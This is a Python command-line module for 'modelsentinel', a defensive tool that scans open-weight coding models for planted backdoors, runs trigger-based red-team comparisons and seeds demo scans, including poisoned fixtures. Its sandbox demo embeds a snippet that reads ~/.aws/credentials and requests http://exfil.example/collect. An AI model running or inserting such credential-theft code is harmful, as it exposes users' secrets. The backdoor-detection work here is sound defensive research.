"""Command line: sentinel scan | redteam | report | serve | probes | demo."""

from __future__ import annotations

import argparse
import json
import sys
import uuid
from datetime import datetime, timezone
from pathlib import Path

from modelsentinel import __version__
from modelsentinel.db import connect, get_scan, list_scans
from modelsentinel.pipeline import default_db_path, scan_source
from modelsentinel.policy import ci_should_block, load_policy
from modelsentinel.report import render


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(prog="sentinel", description="Offline checks for open-weight coding models.")
    parser.add_argument("--version", action="version", version=f"modelsentinel {__version__}")
    parser.add_argument("--db", default=None, help="SQLite path. Default: .modelsentinel/sentinel.db")
    sub = parser.add_subparsers(dest="cmd", required=True)

    scan = sub.add_parser("scan", help="Hash and scan a local model file or directory. Does not load weights.")
    scan.add_argument("source")
    scan.add_argument("--manifest", default=None)
    scan.add_argument("--policy", default=None)
    scan.add_argument("--format", default="text", choices=["text", "json", "sarif", "html"])
    scan.add_argument("-o", "--output", default=None)
    scan.add_argument("--ci", action="store_true")
    scan.set_defaults(func=_cmd_scan)

    red = sub.add_parser("redteam", help="Differential coding tasks with and without YAML triggers.")
    red.add_argument("model")
    red.add_argument("--tasks", default=None)
    red.add_argument("--triggers", default=None)
    red.add_argument("--runs", type=int, default=8)
    red.add_argument("--policy", default=None)
    red.add_argument("--sandbox", action="store_true")
    red.add_argument("--limit", type=int, default=None, help="Only the first N tasks. For smoke tests.")
    red.add_argument("--format", default="text", choices=["text", "json", "sarif", "html"])
    red.add_argument("-o", "--output", default=None)
    red.add_argument("--ci", action="store_true")
    red.set_defaults(func=_cmd_redteam)

    report = sub.add_parser("report", help="Render a stored scan.")
    report.add_argument("scan_id")
    report.add_argument("--format", default="html", choices=["json", "sarif", "html"])
    report.add_argument("-o", "--output", default=None)
    report.set_defaults(func=_cmd_report)

    probes = sub.add_parser("probes", help="Experimental linear probe on caller-supplied activation JSON.")
    probes.add_argument("--baseline", required=True)
    probes.add_argument("--triggered", required=True)
    probes.set_defaults(func=_cmd_probes)

    demo = sub.add_parser("demo", help="Write fixtures and store the acceptance scans.")
    demo.add_argument("--runs", type=int, default=8)
    demo.set_defaults(func=_cmd_demo)

    serve = sub.add_parser("serve", help="Local dashboard and API.")
    serve.add_argument("--host", default="127.0.0.1")
    serve.add_argument("--port", type=int, default=8741)
    serve.add_argument("--demo", action="store_true", help="Seed the database when it is empty.")
    serve.set_defaults(func=_cmd_serve)

    args = parser.parse_args(argv)
    try:
        return args.func(args)
    except (FileNotFoundError, ValueError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 2


def _db(args) -> Path:
    return Path(args.db) if args.db else default_db_path()


def _emit(record: dict, fmt: str, output: str | None) -> None:
    if fmt == "text":
        print(f"verdict: {record['verdict']}  score: {record['score']}")
        print(record.get("summary", ""))
        for finding in record.get("findings") or []:
            if finding["severity"] == "info":
                continue
            print(f"  {finding['severity'].upper():8} {finding['category']:24} {finding['message']}")
        print(f"scan id: {record['id']}")
        return
    text = render(record, fmt)
    if output:
        Path(output).write_text(text, encoding="utf-8")
        print(output)
    else:
        print(text)


def _finish(record: dict, args, policy: dict) -> int:
    _emit(record, args.format, args.output)
    if args.ci and ci_should_block(record["verdict"], policy):
        return 1
    return 0


def _cmd_scan(args) -> int:
    policy = load_policy(args.policy)
    record = scan_source(args.source, policy=policy, manifest=args.manifest, db_path=_db(args))
    return _finish(record, args, policy)


def _cmd_redteam(args) -> int:
    from modelsentinel.redteam import run_redteam

    policy = load_policy(args.policy)
    record = run_redteam(
        args.model,
        tasks_path=args.tasks,
        triggers_path=args.triggers,
        runs=args.runs,
        policy=policy,
        sandbox=args.sandbox,
        task_limit=args.limit,
    )
    conn = connect(_db(args))
    try:
        from modelsentinel.db import save_scan

        save_scan(conn, record)
    finally:
        conn.close()
    return _finish(record, args, policy)


def _cmd_report(args) -> int:
    conn = connect(_db(args))
    try:
        record = get_scan(conn, args.scan_id)
    finally:
        conn.close()
    if record is None:
        print(f"error: scan {args.scan_id} not found", file=sys.stderr)
        return 2
    _emit(record, args.format, args.output)
    return 0


def _cmd_probes(args) -> int:
    from modelsentinel.probes import contrast_probe, load_vectors

    result = contrast_probe(load_vectors(args.baseline), load_vectors(args.triggered))
    print(json.dumps(result, indent=2))
    return 0


def seed_demo(db_path: Path, runs: int = 8) -> list[dict]:
    from modelsentinel.fixtureslib import write_fixtures
    from modelsentinel.redteam import run_redteam
    from modelsentinel.db import save_scan

    root = Path(__file__).resolve().parents[2] / "fixtures"
    paths = write_fixtures(root)
    policy = load_policy()
    records = [
        scan_source(str(paths["pkl"]), policy=policy, persist=False),
        scan_source(str(paths["bin"]), policy=policy, persist=False),
        scan_source(str(paths["poisoned_gguf"]), policy=policy, persist=False),
        scan_source(str(paths["clean_gguf"]), policy=policy, persist=False),
        scan_source(str(paths["safe"]), policy=policy, persist=False),
        scan_source(str(paths["remote"]), policy=policy, persist=False),
        scan_source(str(paths["planted"]), policy=policy, persist=False),
        run_redteam(str(paths["planted"]), runs=runs, policy=policy, sandbox=True),
        run_redteam("clean:coder", runs=runs, policy=policy),
        _sandbox_demo_record(),
    ]
    conn = connect(db_path)
    try:
        for record in records:
            save_scan(conn, record)
    finally:
        conn.close()
    return records


def _sandbox_demo_record() -> dict:
    """Store one real sandbox run so the timeline is evidence, not a placeholder."""
    from modelsentinel.findings import Finding
    from modelsentinel.sandboxrun import run_source
    from modelsentinel.scoring import judge

    source = (
        "import os\n"
        "print(open(os.path.expanduser('~/.aws/credentials')).read())\n"
        "import urllib.request\n"
        "try:\n"
        "    urllib.request.urlopen('http://exfil.example/collect', timeout=1)\n"
        "except Exception:\n"
        "    pass\n"
    )
    result = run_source(source, timeout=8)
    findings = []
    if result.get("canary_read") or result.get("outbound_attempt"):
        findings.append(
            Finding(
                severity="critical",
                category="confirmed_exfiltration",
                code="sandbox_confirmed",
                message="Sandbox logged a canary credential read and a blocked outbound HTTP attempt.",
                evidence=(
                    f"canary_read={result.get('canary_read')} outbound_attempt={result.get('outbound_attempt')} "
                    f"network_probe={result.get('network_probe')} filesystem_probe={result.get('filesystem_probe')} "
                    f"enforcement={result.get('enforcement')}"
                ),
            )
        )
    score, verdict = judge(findings)
    events = []
    for event in result.get("events") or []:
        if event.get("probe"):
            continue
        events.append(
            {
                "label": "canary-snippet",
                "kind": event.get("kind", ""),
                "detail": str(event.get("detail") or event.get("event") or "")[:300],
            }
        )
    return {
        "id": uuid.uuid4().hex[:12],
        "created_at": datetime.now(timezone.utc).replace(microsecond=0).isoformat(),
        "source": "sandbox:canary-and-exfil-snippet",
        "source_kind": "sandbox",
        "kind": "sandbox",
        "name": "sandbox canary",
        "verdict": verdict,
        "score": score,
        "summary": "Executed a snippet that reads the canary AWS file and requests http://exfil.example/collect. The request was blocked.",
        "findings": [item.to_dict() for item in findings],
        "files": [],
        "generations": [],
        "sandbox_events": events,
        "redteam": None,
        "sandbox": {
            "samples": 1,
            "canary_read": bool(result.get("canary_read")),
            "outbound_attempt": bool(result.get("outbound_attempt")),
        },
        "limitation": "The sandbox contained this snippet. It does not say anything about a model that was not executed here.",
    }


def _cmd_demo(args) -> int:
    records = seed_demo(_db(args), runs=args.runs)
    for record in records:
        print(f"{record['verdict']:4}  {record['kind']:8}  {record['source']}")
    return 0


def _cmd_serve(args) -> int:
    import uvicorn

    from modelsentinel.api import create_app

    db_path = _db(args)
    if args.demo:
        conn = connect(db_path)
        try:
            empty = not list_scans(conn)
        finally:
            conn.close()
        if empty:
            print("seeding demo scans", flush=True)
            seed_demo(db_path, runs=8)
    app = create_app(db_path)
    uvicorn.run(app, host=args.host, port=args.port, log_level="info")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
